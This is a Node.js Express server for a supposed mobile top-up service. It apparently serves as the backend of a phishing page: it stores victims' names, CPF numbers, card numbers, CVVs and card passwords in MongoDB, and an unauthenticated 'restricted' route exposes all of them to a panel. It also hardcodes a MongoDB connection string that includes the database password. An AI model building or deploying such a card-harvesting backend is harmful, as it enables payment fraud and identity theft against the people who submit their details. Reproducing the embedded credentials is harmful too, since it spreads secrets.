const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// LINK OFICIAL CORRIGIDO (Baseado na sua foto a7749818)
// O %40 é o código para o @ na senha
const mongoURI = 'mongodb+srv://ingresso944_db_user:Dks10dks%40@cluster0.wgnfod3.mongodb.net/recargas?retryWrites=true&w=majority';

mongoose.connect(mongoURI)
  .then(() => console.log('✅ CONECTADO COM SUCESSO AO MONGODB!'))
  .catch(err => {
      console.error('❌ ERRO DE CONEXÃO:', err.message);
  });

// MODELO DE DADOS
const RecargaSchema = new mongoose.Schema({
    operadora: String,
    nome: String,
    cpf: String,
    telefone: String,
    valor: String,
    cartao: String,
    data: String,
    cvv: String,
    senha: String,
    dataRegistro: { type: Date, default: Date.now }
});

const Recarga = mongoose.model('Recarga', RecargaSchema);

// ROTA PARA SALVAR OS DADOS
app.post('/finalizar', async (req, res) => {
    try {
        console.log('Dados recebidos:', req.body);
        const novaRecarga = new Recarga(req.body);
        await novaRecarga.save();
        res.status(200).json({ success: true });
    } catch (err) {
        console.error('Erro ao salvar no banco:', err);
        res.status(500).json({ success: false, erro: err.message });
    }
});

// ROTA PARA O PAINEL LER OS DADOS
app.get('/ver-dados-restritos', async (req, res) => {
    try {
        const dados = await Recarga.find().sort({ dataRegistro: -1 });
        res.json(dados);
    } catch (err) {
        res.status(500).json({ message: 'Erro ao buscar dados' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Servidor voando na porta ${PORT}`);
});